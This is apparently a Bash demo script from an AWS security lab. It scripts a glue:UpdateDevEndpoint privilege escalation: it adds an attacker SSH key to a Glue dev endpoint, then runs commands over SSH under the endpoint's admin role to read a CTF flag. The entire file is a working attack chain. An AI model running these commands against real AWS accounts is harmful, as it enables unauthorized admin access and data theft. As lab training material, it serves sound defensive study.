#!/bin/bash

# Demo script for glue:UpdateDevEndpoint privilege escalation
# This script demonstrates how a user with UpdateDevEndpoint can add SSH key to existing endpoint


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-glue-002-to-admin-starting-user"
TARGET_ROLE="pl-prod-glue-002-to-admin-target-role"
SSH_KEY_PATH="/tmp/pl-glue-002-updatede-key"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Glue UpdateDevEndpoint Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}ℹ NOTE: This scenario uses a pre-existing Glue Dev Endpoint${NC}"
echo -e "${BLUE}ℹ The endpoint is already running (deployed by Terraform)${NC}"
echo -e "${BLUE}ℹ Cost: ~$2.20/hour (already incurred by having the scenario enabled)${NC}"
echo -e "${BLUE}ℹ This demo will add an SSH key to the existing endpoint${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_glue_002_glue_updatedevendpoint.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and endpoint info
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
DEV_ENDPOINT_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.dev_endpoint_name')
TARGET_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$DEV_ENDPOINT_NAME" == "null" ] || [ -z "$DEV_ENDPOINT_NAME" ]; then
    echo -e "${RED}Error: Could not extract endpoint name from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo "Target Endpoint: $DEV_ENDPOINT_NAME"
echo "Target Role: $TARGET_ROLE_NAME"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify lack of admin permissions
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Discover existing dev endpoint
echo -e "${YELLOW}Step 5: Discovering existing Glue dev endpoint${NC}"
use_readonly_creds
echo "Listing Glue dev endpoints..."

show_cmd "ReadOnly" "aws glue get-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.[EndpointName,Status,RoleArn]' --output text"
ENDPOINT_INFO=$(aws glue get-dev-endpoint \
    --region "$AWS_REGION" \
    --endpoint-name "$DEV_ENDPOINT_NAME" \
    --query 'DevEndpoint.[EndpointName,Status,RoleArn]' \
    --output text 2>/dev/null || echo "")

if [ -n "$ENDPOINT_INFO" ]; then
    ENDPOINT_STATUS=$(echo "$ENDPOINT_INFO" | awk '{print $2}')
    ENDPOINT_ROLE=$(echo "$ENDPOINT_INFO" | awk '{print $3}')

    echo "Found endpoint: $DEV_ENDPOINT_NAME"
    echo "Status: $ENDPOINT_STATUS"
    echo "Role: $ENDPOINT_ROLE"

    if [[ $ENDPOINT_ROLE == *"$TARGET_ROLE_NAME"* ]]; then
        echo -e "${GREEN}✓ Found endpoint with privileged role!${NC}"
    else
        echo -e "${YELLOW}⚠ Warning: Endpoint may not have the expected role${NC}"
    fi

    if [ "$ENDPOINT_STATUS" != "READY" ]; then
        echo -e "${RED}Error: Endpoint status is $ENDPOINT_STATUS, not READY${NC}"
        echo "The endpoint must be in READY state. Please wait and try again."
        exit 1
    fi
else
    echo -e "${RED}Error: Could not find dev endpoint $DEV_ENDPOINT_NAME${NC}"
    exit 1
fi
echo ""

# Step 6: Generate SSH key pair
echo -e "${YELLOW}Step 6: Generating SSH key pair${NC}"
if [ -f "$SSH_KEY_PATH" ]; then
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
fi

ssh-keygen -t rsa -b 2048 -f "$SSH_KEY_PATH" -N "" -q
SSH_PUBLIC_KEY=$(cat "${SSH_KEY_PATH}.pub")
echo "Generated SSH key pair at: $SSH_KEY_PATH"
echo -e "${GREEN}✓ SSH key pair generated${NC}\n"

# [EXPLOIT] Step 7: Update dev endpoint with our SSH key
echo -e "${YELLOW}Step 7: Adding SSH public key to existing dev endpoint${NC}"
use_starting_creds
echo "This is the privilege escalation vector - adding our SSH key to the endpoint..."
echo "Endpoint: $DEV_ENDPOINT_NAME"
echo ""

show_attack_cmd "Attacker" "aws glue update-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --add-public-keys \"$SSH_PUBLIC_KEY\" --output json"
aws glue update-dev-endpoint \
    --region "$AWS_REGION" \
    --endpoint-name "$DEV_ENDPOINT_NAME" \
    --add-public-keys "$SSH_PUBLIC_KEY" \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully added SSH key to the dev endpoint!${NC}"
else
    echo -e "${RED}Error: Failed to update dev endpoint${NC}"
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
    exit 1
fi
echo ""

# Step 8: Wait for update to propagate
echo -e "${YELLOW}Step 8: Waiting for SSH key update to propagate${NC}"
echo "Waiting 15 seconds for changes to take effect..."
sleep 15
echo -e "${GREEN}✓ Update propagated${NC}\n"

# [OBSERVATION] Step 9: Get endpoint address
echo -e "${YELLOW}Step 9: Retrieving dev endpoint connection details${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws glue get-dev-endpoint --region \"$AWS_REGION\" --endpoint-name \"$DEV_ENDPOINT_NAME\" --query 'DevEndpoint.PublicAddress' --output text"
ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
    --region "$AWS_REGION" \
    --endpoint-name "$DEV_ENDPOINT_NAME" \
    --query 'DevEndpoint.PublicAddress' \
    --output text)

if [ -z "$ENDPOINT_ADDRESS" ] || [ "$ENDPOINT_ADDRESS" = "None" ]; then
    echo -e "${RED}Error: Could not retrieve endpoint address${NC}"
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
    exit 1
fi

echo "Endpoint Address: $ENDPOINT_ADDRESS"
echo -e "${GREEN}✓ Retrieved endpoint connection details${NC}\n"

# Step 10: Connect to endpoint and verify admin access (non-interactive)
echo -e "${YELLOW}Step 10: Connecting to dev endpoint via SSH and verifying admin access${NC}"
echo "The Glue dev endpoint runs with the admin role's credentials..."
echo "Executing: aws iam list-users --max-items 3"
echo ""

# Set SSH options for non-interactive execution
SSH_OPTIONS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=30"

# Execute AWS CLI command on the Glue dev endpoint and display output directly
if ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" "aws iam list-users --max-items 3 --region $AWS_REGION --output table"; then
    echo ""
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED via Glue Dev Endpoint${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "This could be due to SSH connectivity issues or endpoint not fully ready"
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
    exit 1
fi
echo ""

# Step 11: Demonstrate credential extraction
echo -e "${YELLOW}Step 11: Extracting AWS credentials from the endpoint${NC}"
echo "Retrieving the admin role credentials from the endpoint environment..."
echo ""

CREDS_OUTPUT=$(ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" "aws sts get-caller-identity --region $AWS_REGION --output json" 2>/dev/null)

if [ $? -eq 0 ] && [ -n "$CREDS_OUTPUT" ]; then
    echo "Identity running on the endpoint:"
    echo "$CREDS_OUTPUT" | jq '.'
    echo ""

    ENDPOINT_ARN=$(echo "$CREDS_OUTPUT" | jq -r '.Arn')
    if [[ $ENDPOINT_ARN == *"$TARGET_ROLE_NAME"* ]]; then
        echo -e "${GREEN}✓ Confirmed: Endpoint is running with admin role credentials${NC}"
    else
        echo -e "${YELLOW}⚠ Warning: Endpoint may not be using the expected role${NC}"
    fi
else
    echo -e "${YELLOW}⚠ Could not retrieve identity (non-critical)${NC}"
fi
echo ""

# [EXPLOIT] Step 12: Capture CTF flag via SSH on the Glue dev endpoint
echo -e "${YELLOW}Step 12: Capturing CTF flag from SSM Parameter Store${NC}"
echo "The Glue dev endpoint runs as the admin role — using the SSH session to call ssm:GetParameter..."
echo ""
FLAG_PARAM_NAME="/pathfinding-labs/flags/glue-002-to-admin"
show_attack_cmd "Attacker (via Glue endpoint)" "ssh ... \"aws ssm get-parameter --region $AWS_REGION --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text\""
FLAG_VALUE=$(ssh $SSH_OPTIONS -i "$SSH_KEY_PATH" "glue@${ENDPOINT_ADDRESS}" \
    "aws ssm get-parameter --region $AWS_REGION --name '$FLAG_PARAM_NAME' --query 'Parameter.Value' --output text" 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    rm -f "$SSH_KEY_PATH" "${SSH_KEY_PATH}.pub"
    exit 1
fi
echo ""

# Summary
# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with glue:UpdateDevEndpoint)"
echo "2. Discovered existing Glue dev endpoint: $DEV_ENDPOINT_NAME"
echo "3. Endpoint was already running with admin role: $TARGET_ROLE_NAME"
echo "4. Added SSH public key to the endpoint via UpdateDevEndpoint"
echo "5. Connected via SSH to the endpoint"
echo "6. Executed AWS CLI commands with admin role credentials"
echo "7. Achieved: Administrator Access via existing Glue Dev Endpoint"
echo "8. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (glue:UpdateDevEndpoint) → Add SSH key to existing endpoint"
echo -e "  → (SSH Access) → Execute AWS commands as $TARGET_ROLE_NAME"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Key Difference from glue:CreateDevEndpoint:${NC}"
echo "- UpdateDevEndpoint: Modifies existing endpoint (faster, no provisioning wait)"
echo "- CreateDevEndpoint: Creates new endpoint (5-10 minute provisioning time)"
echo "- Both achieve the same result: SSH access with endpoint's privileged role"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- SSH Public Key added to endpoint: $DEV_ENDPOINT_NAME"
echo "- Endpoint Address: $ENDPOINT_ADDRESS"
echo "- SSH Private Key: $SSH_KEY_PATH"
echo "- SSH Public Key: ${SSH_KEY_PATH}.pub"
echo "- Endpoint Role: $TARGET_ROLE_NAME"

echo -e "\n${BLUE}ℹ NOTE: The Glue dev endpoint continues running${NC}"
echo -e "${BLUE}ℹ The endpoint was created by Terraform and remains as infrastructure${NC}"
echo -e "${BLUE}ℹ Only your SSH key is an attack artifact (will be removed by cleanup)${NC}"
echo ""
echo -e "${YELLOW}To clean up the attack artifacts:${NC}"
echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
